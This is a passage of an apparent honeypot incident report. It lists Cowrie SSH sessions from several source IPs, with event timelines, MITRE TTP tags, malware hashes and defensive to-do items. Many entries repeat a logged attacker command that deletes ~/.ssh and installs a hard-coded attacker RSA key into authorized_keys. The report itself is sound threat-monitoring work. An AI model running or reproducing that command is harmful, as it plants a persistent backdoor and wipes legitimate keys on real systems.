| `2026-06-13 07:01:57` | `cowrie.client.version` |
| `2026-06-13 07:01:57` | `cowrie.client.kex` |
| `2026-06-13 07:01:58` | `cowrie.login.success` |
| `2026-06-13 07:01:58` | `cowrie.session.params` |
| `2026-06-13 07:01:58` | `cowrie.command.input` |
| `2026-06-13 07:01:58` | `cowrie.command.failed` |
| `2026-06-13 07:01:58` | `cowrie.log.closed` |
| `2026-06-13 07:01:59` | `cowrie.session.params` |
| `2026-06-13 07:01:59` | `cowrie.command.input` |
| `2026-06-13 07:01:59` | `cowrie.session.file_download` |
| `2026-06-13 07:01:59` | `cowrie.log.closed` |
| `2026-06-13 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ddd50520341

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 07:02 |
| **Last Seen** | 2026-06-13 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:02:01` | `cowrie.session.connect` |
| `2026-06-13 07:02:01` | `cowrie.client.version` |
| `2026-06-13 07:02:01` | `cowrie.client.kex` |
| `2026-06-13 07:02:02` | `cowrie.login.success` |
| `2026-06-13 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357e79d939e1

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-13 07:04 |
| **Last Seen** | 2026-06-13 07:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:04:04` | `cowrie.session.connect` |
| `2026-06-13 07:04:04` | `cowrie.client.version` |
| `2026-06-13 07:04:04` | `cowrie.client.kex` |
| `2026-06-13 07:04:06` | `cowrie.login.success` |
| `2026-06-13 07:04:08` | `cowrie.session.params` |
| `2026-06-13 07:04:08` | `cowrie.command.input` |
| `2026-06-13 07:04:08` | `cowrie.command.failed` |
| `2026-06-13 07:04:10` | `cowrie.log.closed` |
| `2026-06-13 07:04:10` | `cowrie.session.params` |
| `2026-06-13 07:04:10` | `cowrie.command.input` |
| `2026-06-13 07:04:11` | `cowrie.session.file_download` |
| `2026-06-13 07:04:11` | `cowrie.log.closed` |
| `2026-06-13 07:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600e29fa5fc9

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-13 07:04 |
| **Last Seen** | 2026-06-13 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:04:16` | `cowrie.session.connect` |
| `2026-06-13 07:04:16` | `cowrie.client.version` |
| `2026-06-13 07:04:16` | `cowrie.client.kex` |
| `2026-06-13 07:04:17` | `cowrie.login.success` |
| `2026-06-13 07:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0dba1ec826

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:05 |
| **Last Seen** | 2026-06-13 07:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:05:59` | `cowrie.session.connect` |
| `2026-06-13 07:05:59` | `cowrie.client.version` |
| `2026-06-13 07:05:59` | `cowrie.client.kex` |
| `2026-06-13 07:06:00` | `cowrie.login.success` |
| `2026-06-13 07:06:01` | `cowrie.session.params` |
| `2026-06-13 07:06:01` | `cowrie.command.input` |
| `2026-06-13 07:06:01` | `cowrie.command.failed` |
| `2026-06-13 07:06:01` | `cowrie.log.closed` |
| `2026-06-13 07:06:01` | `cowrie.session.params` |
| `2026-06-13 07:06:01` | `cowrie.command.input` |
| `2026-06-13 07:06:02` | `cowrie.session.file_download` |
| `2026-06-13 07:06:02` | `cowrie.log.closed` |
| `2026-06-13 07:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ffc449b8416

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:06 |
| **Last Seen** | 2026-06-13 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:06:05` | `cowrie.session.connect` |
| `2026-06-13 07:06:05` | `cowrie.client.version` |
| `2026-06-13 07:06:05` | `cowrie.client.kex` |
| `2026-06-13 07:06:06` | `cowrie.login.success` |
| `2026-06-13 07:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909becb84048

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:09 |
| **Last Seen** | 2026-06-13 07:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:09:54` | `cowrie.session.connect` |
| `2026-06-13 07:09:54` | `cowrie.client.version` |
| `2026-06-13 07:09:54` | `cowrie.client.kex` |
| `2026-06-13 07:09:55` | `cowrie.login.success` |
| `2026-06-13 07:09:55` | `cowrie.session.params` |
| `2026-06-13 07:09:55` | `cowrie.command.input` |
| `2026-06-13 07:09:55` | `cowrie.command.failed` |
| `2026-06-13 07:09:56` | `cowrie.log.closed` |
| `2026-06-13 07:09:56` | `cowrie.session.params` |
| `2026-06-13 07:09:56` | `cowrie.command.input` |
| `2026-06-13 07:09:56` | `cowrie.session.file_download` |
| `2026-06-13 07:09:56` | `cowrie.log.closed` |
| `2026-06-13 07:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7add4934f2e8

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:09 |
| **Last Seen** | 2026-06-13 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:09:59` | `cowrie.session.connect` |
| `2026-06-13 07:09:59` | `cowrie.client.version` |
| `2026-06-13 07:09:59` | `cowrie.client.kex` |
| `2026-06-13 07:10:00` | `cowrie.login.success` |
| `2026-06-13 07:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65df71fb42dc

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:11 |
| **Last Seen** | 2026-06-13 07:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:11:56` | `cowrie.session.connect` |
| `2026-06-13 07:11:56` | `cowrie.client.version` |
| `2026-06-13 07:11:56` | `cowrie.client.kex` |
| `2026-06-13 07:11:57` | `cowrie.login.success` |
| `2026-06-13 07:11:58` | `cowrie.session.params` |
| `2026-06-13 07:11:58` | `cowrie.command.input` |
| `2026-06-13 07:11:58` | `cowrie.command.failed` |
| `2026-06-13 07:11:58` | `cowrie.log.closed` |
| `2026-06-13 07:11:58` | `cowrie.session.params` |
| `2026-06-13 07:11:58` | `cowrie.command.input` |
| `2026-06-13 07:11:59` | `cowrie.session.file_download` |
| `2026-06-13 07:11:59` | `cowrie.log.closed` |
| `2026-06-13 07:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd51de347078

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:12 |
| **Last Seen** | 2026-06-13 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:12:01` | `cowrie.session.connect` |
| `2026-06-13 07:12:01` | `cowrie.client.version` |
| `2026-06-13 07:12:02` | `cowrie.client.kex` |
| `2026-06-13 07:12:03` | `cowrie.login.success` |
| `2026-06-13 07:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99520c96d95b

| Field | Detail |
|---|---|
| **Source IP** | `160.22.18[.]220` |
| **First Seen** | 2026-06-13 07:13 |
| **Last Seen** | 2026-06-13 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:13:23` | `cowrie.session.connect` |
| `2026-06-13 07:13:23` | `cowrie.client.version` |
| `2026-06-13 07:13:23` | `cowrie.client.kex` |
| `2026-06-13 07:13:23` | `cowrie.login.success` |
| `2026-06-13 07:13:24` | `cowrie.session.params` |
| `2026-06-13 07:13:24` | `cowrie.command.input` |
| `2026-06-13 07:13:24` | `cowrie.command.failed` |
| `2026-06-13 07:13:24` | `cowrie.log.closed` |
| `2026-06-13 07:13:24` | `cowrie.session.params` |
| `2026-06-13 07:13:24` | `cowrie.command.input` |
| `2026-06-13 07:13:24` | `cowrie.session.file_download` |
| `2026-06-13 07:13:24` | `cowrie.log.closed` |
| `2026-06-13 07:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.18[.]220` to AbuseIPDB if not already reported
- [ ] Block `160.22.18[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c711aa9fcb9

| Field | Detail |
|---|---|
| **Source IP** | `160.22.18[.]220` |
| **First Seen** | 2026-06-13 07:13 |
| **Last Seen** | 2026-06-13 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:13:26` | `cowrie.session.connect` |
| `2026-06-13 07:13:26` | `cowrie.client.version` |
| `2026-06-13 07:13:26` | `cowrie.client.kex` |
| `2026-06-13 07:13:26` | `cowrie.login.success` |
| `2026-06-13 07:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.18[.]220` to AbuseIPDB if not already reported
- [ ] Block `160.22.18[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4712b004c2

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:13 |
| **Last Seen** | 2026-06-13 07:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:13:57` | `cowrie.session.connect` |
| `2026-06-13 07:13:57` | `cowrie.client.version` |
| `2026-06-13 07:13:57` | `cowrie.client.kex` |
| `2026-06-13 07:13:58` | `cowrie.login.success` |
| `2026-06-13 07:13:59` | `cowrie.session.params` |
| `2026-06-13 07:13:59` | `cowrie.command.input` |
| `2026-06-13 07:13:59` | `cowrie.command.failed` |
| `2026-06-13 07:13:59` | `cowrie.log.closed` |
| `2026-06-13 07:13:59` | `cowrie.session.params` |
| `2026-06-13 07:13:59` | `cowrie.command.input` |
| `2026-06-13 07:14:00` | `cowrie.session.file_download` |
| `2026-06-13 07:14:00` | `cowrie.log.closed` |
| `2026-06-13 07:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4873cd159264

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:14 |
| **Last Seen** | 2026-06-13 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:14:02` | `cowrie.session.connect` |
| `2026-06-13 07:14:02` | `cowrie.client.version` |
| `2026-06-13 07:14:03` | `cowrie.client.kex` |
| `2026-06-13 07:14:03` | `cowrie.login.success` |
| `2026-06-13 07:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9510eb2076ad

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:16 |
| **Last Seen** | 2026-06-13 07:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:16:00` | `cowrie.session.connect` |
| `2026-06-13 07:16:00` | `cowrie.client.version` |
| `2026-06-13 07:16:01` | `cowrie.client.kex` |
| `2026-06-13 07:16:01` | `cowrie.login.success` |
| `2026-06-13 07:16:02` | `cowrie.session.params` |
| `2026-06-13 07:16:02` | `cowrie.command.input` |
| `2026-06-13 07:16:02` | `cowrie.command.failed` |
| `2026-06-13 07:16:02` | `cowrie.log.closed` |
| `2026-06-13 07:16:03` | `cowrie.session.params` |
| `2026-06-13 07:16:03` | `cowrie.command.input` |
| `2026-06-13 07:16:03` | `cowrie.session.file_download` |
| `2026-06-13 07:16:03` | `cowrie.log.closed` |
| `2026-06-13 07:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ded3e00691

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:16 |
| **Last Seen** | 2026-06-13 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:16:06` | `cowrie.session.connect` |
| `2026-06-13 07:16:06` | `cowrie.client.version` |
| `2026-06-13 07:16:06` | `cowrie.client.kex` |
| `2026-06-13 07:16:07` | `cowrie.login.success` |
| `2026-06-13 07:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73846a1815ef

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:20 |
| **Last Seen** | 2026-06-13 07:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:20:22` | `cowrie.session.connect` |
| `2026-06-13 07:20:22` | `cowrie.client.version` |
| `2026-06-13 07:20:22` | `cowrie.client.kex` |
| `2026-06-13 07:20:23` | `cowrie.login.success` |
| `2026-06-13 07:20:24` | `cowrie.session.params` |
| `2026-06-13 07:20:24` | `cowrie.command.input` |
| `2026-06-13 07:20:24` | `cowrie.command.failed` |
| `2026-06-13 07:20:24` | `cowrie.log.closed` |
| `2026-06-13 07:20:25` | `cowrie.session.params` |
| `2026-06-13 07:20:25` | `cowrie.command.input` |
| `2026-06-13 07:20:25` | `cowrie.session.file_download` |
| `2026-06-13 07:20:25` | `cowrie.log.closed` |
| `2026-06-13 07:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bda6cbec00d

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:20 |
| **Last Seen** | 2026-06-13 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:20:28` | `cowrie.session.connect` |
| `2026-06-13 07:20:28` | `cowrie.client.version` |
| `2026-06-13 07:20:28` | `cowrie.client.kex` |
| `2026-06-13 07:20:29` | `cowrie.login.success` |
| `2026-06-13 07:20:29` | `cowrie.session.closed` |

